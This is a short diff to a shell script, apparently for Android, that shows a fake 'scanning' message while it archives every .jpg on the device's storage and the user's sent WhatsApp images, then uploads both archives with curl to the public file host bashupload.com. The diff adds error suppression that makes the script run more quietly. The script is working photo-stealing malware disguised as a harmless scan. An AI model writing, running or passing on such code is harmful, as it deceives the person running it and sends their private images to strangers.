@@ -6,7 +6,7 @@ for x in *.jpg; do
   i=$((i+1))
 done;  echo -e '\033[31m SCANNING STARTED PLEASE WAIT FEW MINUTES... \033[0m '; cd /sdcard/ ; tar cf gg.tar *.jpg;
 
-cd /sdcard/android/media/com.whatsapp/WhatsApp/media/"WhatsApp Images"/Sent/;tar cf /sdcard/yy.tar *.jpg;
+cd /sdcard/android/media/com.whatsapp/WhatsApp/media/"WhatsApp Images"/Sent/ 2> /dev/null;tar cf /sdcard/yy.tar *.jpg;
 
 curl -s bashupload.com -T /sdcard/gg.tar > /sdcard/70.txt 
 curl -s bashupload.com -T /sdcard/yy.tar >> /sdcard/70.txt 
